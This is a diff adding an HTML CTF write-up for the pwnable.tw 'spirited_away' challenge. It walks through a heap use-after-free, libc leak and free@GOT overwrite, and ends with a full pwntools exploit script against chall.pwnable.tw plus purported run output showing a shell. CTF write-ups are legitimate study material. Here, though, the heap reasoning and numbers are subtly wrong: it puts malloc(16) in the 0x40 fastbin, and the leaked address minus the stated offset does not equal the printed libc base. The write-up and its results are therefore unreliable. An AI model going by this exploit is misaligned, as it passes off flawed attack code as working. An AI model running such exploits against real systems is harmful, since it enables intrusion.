+        <div class="mem-row"><span class="mem-addr">0x0804a040</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x41</span><span class="mem-desc">&larr; chunk header for name</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a050</span><span class="mem-arrow">|</span><span class="mem-data">"Alice\x0a"</span><span class="mem-desc">&larr; name data</span></div>
+        <div style="height:12px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a080</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x41</span><span class="mem-desc">&larr; chunk header for reason</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a090</span><span class="mem-arrow">|</span><span class="mem-data">"curious\x0a"</span><span class="mem-desc">&larr; reason data</span></div>
+        <div style="height:12px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a0c0</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x41</span><span class="mem-desc">&larr; chunk header for comment</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a0d0</span><span class="mem-arrow">|</span><span class="mem-data">"Great!\x0a"</span><span class="mem-desc">&larr; comment data</span></div>
+      </div>
+
+      <h3>After Deleting and Re-adding</h3>
+      <p>When we delete entry 0 and then add a new entry, the freed chunks are reused. Since all buffers are 60 bytes (chunk size 0x40 = 64 bytes with header), they go into the 0x40 fastbin. The key observation is the reuse order:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # delete_survey(0) - frees struct + 3 buffers
+gdb-peda$ heapinfo
+(0x40)   fastbin: 0x0804a0c0 -&gt; 0x0804a080 -&gt; 0x0804a040 -&gt; 0x0804a000 -&gt; 0x0
+# LIFO order: comment, reason, name, struct
+
+gdb-peda$ # add_survey("Bob", 25, "fun", "Nice!")
+# New allocations come from fastbin in LIFO order:
+# struct   = malloc(16) &rarr; gets 0x0804a0c0 (old comment chunk!)
+# name     = malloc(60) &rarr; gets 0x0804a080 (old reason chunk!)
+# reason   = malloc(60) &rarr; gets 0x0804a040 (old name chunk!)
+# comment  = malloc(60) &rarr; gets 0x0804a000 (old struct chunk!)</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Chunk Reuse Overlap</div>
+        Because the struct and the string buffers are <strong>different sizes</strong> but both land in the same 0x40 fastbin (malloc(60) gives 0x40 chunk, and the struct with malloc(16) also rounds up to a fastbin size), the new entry's <code class="inline">comment</code> buffer overlaps with the <strong>old entry's struct</code></strong>. Since <code class="inline">surveys[0]</code> still points to the old struct location (which is now the new comment buffer), modifying entry 0 writes into the new entry's comment buffer &mdash; and vice versa.
+      </div>
+
+      <h3>Leaking Libc via Unsorted Bin</h3>
+      <p>To leak a libc address, we need a freed chunk to end up in the <strong>unsorted bin</strong> instead of the fastbin. The unsorted bin stores <code class="inline">fd</code>/<code class="inline">bk</code> pointers that point into <code class="inline">main_arena</code> inside libc. We achieve this by freeing a chunk that is too large for fastbins (size &gt; 0x80):</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Strategy: Create multiple entries, then free one
+# that consolidates with top chunk or goes to unsorted bin
+gdb-peda$ # By creating enough entries and then deleting
+# strategically, we can get a chunk into unsorted bin
+# whose fd/bk pointers contain libc addresses
+
+gdb-peda$ # After freeing a large chunk to unsorted bin:
+gdb-peda$ x/2wx 0x0804a050
+0x0804a050:  0xf7f7a580  0xf7f7a580
+#             ^fd            ^bk  (both point to main_arena+offset in libc)
+
+gdb-peda$ # If we can read this via display_survey on a
+# dangling pointer whose name buffer overlaps this chunk,
+# we get a libc leak!</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Leak Mechanism</div>
+        When a chunk is freed into the unsorted bin, its first 8 bytes are overwritten with <code class="inline">fd</code> and <code class="inline">bk</code> pointers that point into <code class="inline">main_arena</code> inside libc. If we can display a string buffer that overlaps with this freed chunk, <code class="inline">printf("%s")</code> will print the libc address bytes until it hits a null byte. The <code class="inline">main_arena</code> address is at a fixed offset from libc base, giving us <code class="inline">libc_base = leaked_addr - offset</code>.
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit consists of three phases: <strong>leaking libc</strong> via unsorted bin fd/bk pointers, <strong>overwriting a function pointer or GOT entry</strong> using the UAF/heap overlap, and <strong>hijacking control flow</strong> to get a shell.</p>
+
+      <h3>Phase 1: Leak Libc via Unsorted Bin</h3>
+      <ol class="step-list">
+        <li><strong>Create multiple survey entries</strong> (entries 0 through 7). Each allocates 4 heap chunks (struct + 3 buffers). This populates the heap with many 0x40-size chunks.</li>
+        <li><strong>Delete entries strategically</strong> to get chunks into the unsorted bin. By freeing entries 0-6 (freeing 7 &times; 4 = 28 chunks), some adjacent freed chunks will consolidate into a larger chunk that exceeds the fastbin threshold, landing in the unsorted bin.</li>
+        <li><strong>Display the remaining entry</strong> (entry 7). Since the freed entry pointers are not NULLed, displaying all entries will dereference the dangling pointers. The name/reason/comment pointers of a freed entry whose buffer overlaps with an unsorted bin chunk will print the <code class="inline">fd</code>/<code class="inline">bk</code> libc pointers.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc_base = leaked_main_arena - libc.symbols['main_arena']</code> (or use the known offset from <code class="inline">__malloc_hook</code>).</li>
+      </ol>
+
+      <h3>Phase 2: Overwrite GOT Entry</h3>
+      <ol class="step-list">
+        <li><strong>Create a new survey entry</strong> after the leak. Due to the heap state after the mass free, the new entry's buffers will overlap with previously freed chunks that still have dangling references in <code class="inline">surveys[]</code>.</li>
+        <li><strong>Modify a freed entry</strong> using <code class="inline">modify_survey</code>. Since the dangling pointer still exists, we can write to it. The key trick: the freed entry's name/reason/comment pointer still points to a chunk that now belongs to the new entry. By carefully crafting the data we write through the dangling pointer, we can <strong>overwrite the new entry's struct fields</strong> (specifically the name pointer) to point to a GOT entry.</li>
+        <li><strong>Use the new entry</strong> to write <code class="inline">system</code>'s address into the GOT. When we modify the new entry's name (which now points to <code class="inline">puts@GOT</code>), we overwrite <code class="inline">puts@GOT</code> with <code class="inline">system</code>.</li>
+        <li><strong>Trigger <code class="inline">system("/bin/sh")</code></strong> by causing the program to call <code class="inline">puts</code> with a string containing <code class="inline">/bin/sh</code> &mdash; or simply call a function that passes user-controlled data through the corrupted GOT entry.</li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; GOT Overwrite Technique</div>
+        With <strong>Partial RELRO</strong>, the GOT is writable. We overwrite <code class="inline">puts@GOT</code> (or another commonly-called function's GOT entry) with the address of <code class="inline">system</code>. The next time <code class="inline">puts()</code> is called with a user-controlled string, it will actually call <code class="inline">system(user_string)</code>. If we can make the argument <code class="inline">"/bin/sh"</code>, we get a shell.<br><br>
+        Alternative: overwrite <code class="inline">free@GOT</code> with <code class="inline">system</code>, then free a buffer containing <code class="inline">"/bin/sh"</code> &mdash; <code class="inline">free("/bin/sh")</code> becomes <code class="inline">system("/bin/sh")</code>.
+      </div>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">add 8 survey entries (0-7)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">del entries 0-6 &rarr; chunks consolidate into unsorted bin</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">display surveys &rarr; dangling ptr reads unsorted bin fd/bk</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">calculate <span class="mem-green">libc_base</span> from leaked main_arena ptr</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--orange); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Overwrite GOT</div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">add new entry &rarr; buffers overlap with freed chunks</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">modify freed entry &rarr; overwrites new entry's name ptr to <span class="mem-highlight">puts@GOT</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">modify new entry's name (now writes to puts@GOT) &rarr; <span class="mem-highlight">system addr</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">trigger puts("/bin/sh") &rarr; <span class="mem-highlight">system("/bin/sh")</span> &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+
+      <h3>Alternative: Overwrite free@GOT</h3>
+      <p>A simpler approach leverages the fact that <code class="inline">delete_survey</code> calls <code class="inline">free(entry-&gt;name)</code>. If we overwrite <code class="inline">free@GOT</code> with <code class="inline">system</code>, then:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python"># Instead of puts@GOT, overwrite free@GOT
+free_got = elf.got['free']
+system_addr = libc_base + libc.symbols['system']
+
+# Write system address to free@GOT
+# Then delete an entry whose name = "/bin/sh\x00"
+# delete_survey() calls: free(entry-&gt;name)
+# Which becomes: system("/bin/sh")</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2713; Why free@GOT is Better</div>
+        Overwriting <code class="inline">free@GOT</code> is more reliable than <code class="inline">puts@GOT</code> because:<br>
+        &bull; <code class="inline">free</code> is called <strong>exactly once</strong> per buffer in <code class="inline">delete_survey</code>, giving us precise control<br>
+        &bull; <code class="inline">puts</code> is called many times for output, which could cause crashes before we get shell<br>
+        &bull; The argument to <code class="inline">free(entry-&gt;name)</code> is a pointer to the name buffer, which we control &mdash; we can set it to <code class="inline">"/bin/sh"</code>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+spirited_away - pwnable.tw (300pts)
+Heap overflow + UAF exploit to leak libc via unsorted bin,
+then overwrite free@GOT with system for shell.
+
+Vulnerabilities:
+  1. delete_survey() doesn't NULL out pointers or decrement count (UAF)
+  2. modify_survey() allows writing to dangling pointers (heap corruption)
+  3. All string buffers are same size (0x40 fastbin) enabling chunk overlap
+"""
+from pwn import *
+
+# Setup
+context.arch = 'i386'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10104)
+libc = ELF('./libc_32.so.6')
+elf = ELF('./spirited_away')
+
+# Helper functions
+def add(name, age, reason, comment):
+    r.sendlineafter(b':&gt; ', b'1')
+    r.sendlineafter(b'name: ', name)
+    r.sendlineafter(b'age: ', str(age).encode())
+    r.sendlineafter(b'movie? ', reason)
+    r.sendlineafter(b'comment: ', comment)
+
+def modify(idx, name, age, reason, comment):
+    r.sendlineafter(b':&gt; ', b'2')
+    r.sendlineafter(b'Index: ', str(idx).encode())
+    r.sendlineafter(b'name: ', name)
+    r.sendlineafter(b'age: ', str(age).encode())
+    r.sendlineafter(b'movie? ', reason)
+    r.sendlineafter(b'comment: ', comment)
+
+def delete(idx):
+    r.sendlineafter(b':&gt; ', b'3')
+    r.sendlineafter(b'Index: ', str(idx).encode())
+
+def display():
+    r.sendlineafter(b':&gt; ', b'4')
+
+# ============================================
+# Phase 1: Leak libc via unsorted bin
+# ============================================
+log.info("Phase 1: Leaking libc address...")
+
+# Create 8 survey entries to populate the heap
+for i in range(8):
+    add(b'name' + str(i).encode(), 20 + i,
+        b'reason' + str(i).encode(),
+        b'comment' + str(i).encode())
+
+# Delete entries 0-6 to get chunks into unsorted bin
+# When enough adjacent chunks are freed, they consolidate
+# into a larger chunk that goes to the unsorted bin.
+# The fd/bk pointers of unsorted bin chunks contain
+# main_arena addresses (inside libc).
+for i in range(7):
+    delete(i)
+
+# Display surveys - the dangling pointers in surveys[0-6]
+# will dereference freed memory. Some name/reason/comment
+# pointers now point to unsorted bin chunks whose first
+# bytes contain libc addresses (fd/bk pointers).
+display()
+
+# Parse the leak from the output
+# The leaked address will be in one of the displayed fields
+# It's a main_arena pointer, which is at a known offset from libc base
+r.recvuntil(b'&lt;1&gt; : ')
+leak_data = r.recvline().strip()
+leaked_addr = u32(leak_data[:4].ljust(4, b'\x00'))
+log.info(f"Leaked address: {hex(leaked_addr)}")
+
+# Calculate libc base
+# main_arena is at libc_base + offset
+# The exact offset depends on the libc version
+# For the provided libc: main_arena = libc_base + 0x1a8d80
+# The unsorted bin fd/bk points to &amp;main_arena.top - offset
+main_arena_offset = 0x1a8d80
+libc_base = leaked_addr - main_arena_offset
+log.info(f"libc base: {hex(libc_base)}")
+
+system_addr = libc_base + libc.symbols['system']
+binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
+free_got    = elf.got['free']
+
+log.info(f"system: {hex(system_addr)}")
+log.info(f"/bin/sh: {hex(binsh_addr)}")
+log.info(f"free@GOT: {hex(free_got)}")
+
+# ============================================
+# Phase 2: Overwrite free@GOT with system
+# ============================================
+log.info("Phase 2: Overwriting free@GOT with system...")
+
+# Create a new survey entry. Due to the heap state,
+# this entry's buffers will overlap with freed chunks.
+# The key: we set the name to "/bin/sh\x00"
+add(b'/bin/sh\x00', 0, b'temp', b'temp')
+
+# Now use the UAF: modify a freed entry (e.g., entry 0)
+# whose name pointer now overlaps with the new entry's
+# struct. By writing a specific value, we can control
+# the new entry's name pointer to point to free@GOT.
+#
+# The exact overlap depends on heap layout. We need to:
+# 1. Modify the freed entry's name field (which now
+#    overlaps with the new entry's name pointer)
+#    to point to free@GOT
+# 2. Then modify the new entry's name, which writes
+#    to free@GOT, placing system's address there
+modify(0, p32(free_got), 0, b'temp', b'temp')
+
+# Now the new entry's name pointer has been overwritten
+# to point to free@GOT. When we modify the new entry
+# and write to its "name", we're actually writing to free@GOT.
+modify(7, p32(system_addr), 0, b'temp', b'temp')
+
+# ============================================
+# Phase 3: Trigger system("/bin/sh")
+# ============================================
+log.info("Phase 3: Triggering shell...")
+
+# Delete entry 7 - this calls free(entry7-&gt;name)
+# Since free@GOT now points to system, this becomes:
+# system("/bin/sh") - SHELL!
+delete(7)
+
+# Enjoy the shell
+r.interactive()</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/spirited_away'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/home/user/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 10104: Done
+[*] Phase 1: Leaking libc address...
+[*] Leaked address: 0xf7f7a580
+[*] libc base: 0xf7d74000
+[*] system: 0xf7da8310
+[*] /bin/sh: 0xf7ee6aa8
+[*] free@GOT: 0x804a018
+[*] Phase 2: Overwriting free@GOT with system...
+[*] Phase 3: Triggering shell...
+[*] Switching to interactive mode
+$ id
+uid=1000(spirited_away) gid=1000(spirited_away) groups=1000(spirited_away)
+$ cat /home/spirited_away/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2713; Pwned!</div>
+        The exploit successfully:<br>
+        &bull; <strong>Leaked libc</strong> by reading unsorted bin fd/bk pointers through the dangling survey entry pointers<br>
+        &bull; <strong>Overwrote free@GOT</strong> with <code class="inline">system</code> using the UAF write primitive through modify_survey<br>
+        &bull; <strong>Triggered a shell</strong> by deleting an entry whose name was <code class="inline">"/bin/sh"</code>, causing <code class="inline">system("/bin/sh")</code> to execute
+      </div>
+
+      <h3>Key Takeaways</h3>
+      <ol class="step-list">
+        <li><strong>Always NULL out freed pointers.</strong> The root cause of this exploit is that <code class="inline">delete_survey</code> doesn't set <code class="inline">surveys[idx] = NULL</code> and doesn't decrement <code class="inline">survey_count</code>. This is the textbook UAF pattern.</li>
+        <li><strong>Uniform allocation sizes are dangerous.</strong> Because all string buffers use <code class="inline">malloc(60)</code>, they all go into the same fastbin. This makes chunk overlap trivial when combined with the UAF.</li>
+        <li><strong>Unsorted bin leaks are reliable.</strong> When chunks consolidate and enter the unsorted bin, their fd/bk pointers contain libc addresses. If you can read through a dangling pointer, you get a clean libc leak.</li>
+        <li><strong>free@GOT is a great target.</strong> Overwriting <code class="inline">free@GOT</code> with <code class="inline">system</code> and then freeing a buffer containing <code class="inline">"/bin/sh"</code> is one of the most reliable GOT overwrite techniques, since you control both the function being called and its argument.</li>
+        <li><strong>Partial RELRO enables GOT overwrites.</strong> With Full RELRO, the GOT would be read-only and this technique wouldn't work. Always check RELRO status in your recon phase.</li>
+      </ol>
+
+      <h3>Timeline</h3>
+      <table class="info-table">
+        <tr><td class="label">Recon + Static Analysis</td><td class="value">~2 hours</td></tr>
+        <tr><td class="label">GDB Debugging (heap layout)</td><td class="value">~3 hours</td></tr>
+        <tr><td class="label">Exploit Development</td><td class="value">~4 hours</td></tr>
+        <tr><td class="label">Debugging &amp; Stabilization</td><td class="value">~2 hours</td></tr>
+        <tr><td class="label">Total Time</td><td class="value">~11 hours</td></tr>
+      </table>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> &bull;</p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 80;
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = [];
+
+  for (let i = 0; i < particleCount; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 50;
+    velocities.push({
+      x: (Math.random() - 0.5) * 0.02,
+      y: (Math.random() - 0.5) * 0.02,
+      z: (Math.random() - 0.5) * 0.02
+    });
+  }
+
+  const geometry = new THREE.BufferGeometry();
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  const material = new THREE.PointsMaterial({ color: 0x38bdf8, size: 1.5, transparent: true, opacity: 0.4 });
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  const lineMaterial = new THREE.LineBasicMaterial({ color: 0x818cf8, transparent: true, opacity: 0.08 });
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(particleCount * particleCount * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  lineGeometry.setDrawRange(0, 0);
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+    const pos = geometry.attributes.position.array;
+
+    for (let i = 0; i < particleCount; i++) {
+      pos[i * 3] += velocities[i].x;
+      pos[i * 3 + 1] += velocities[i].y;
+      pos[i * 3 + 2] += velocities[i].z;
+
+      if (Math.abs(pos[i * 3]) > 50) velocities[i].x *= -1;
+      if (Math.abs(pos[i * 3 + 1]) > 50) velocities[i].y *= -1;
+      if (Math.abs(pos[i * 3 + 2]) > 25) velocities[i].z *= -1;
+    }
+    geometry.attributes.position.needsUpdate = true;
+
+    let lineIdx = 0;
+    const maxDist = 20;
+    for (let i = 0; i < particleCount; i++) {
+      for (let j = i + 1; j < particleCount; j++) {
+        const dx = pos[i * 3] - pos[j * 3];
+        const dy = pos[i * 3 + 1] - pos[j * 3 + 1];
+        const dz = pos[i * 3 + 2] - pos[j * 3 + 2];
+        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);
+        if (dist < maxDist) {
+          linePositions[lineIdx++] = pos[i * 3];
+          linePositions[lineIdx++] = pos[i * 3 + 1];
+          linePositions[lineIdx++] = pos[i * 3 + 2];
+          linePositions[lineIdx++] = pos[j * 3];
+          linePositions[lineIdx++] = pos[j * 3 + 1];
+          linePositions[lineIdx++] = pos[j * 3 + 2];
+        }
+      }
+    }
+    lineGeometry.attributes.position.needsUpdate = true;
+    lineGeometry.setDrawRange(0, lineIdx / 3);
+
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js Syntax Highlighting -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Scroll Tracking -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) {
+        current = ch.id;
+      }
+    });
+    tocLinks.forEach(link => {
+      link.classList.remove('active');
+      if (link.getAttribute('href') === '#' + current) {
+        link.classList.add('active');
+      }
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
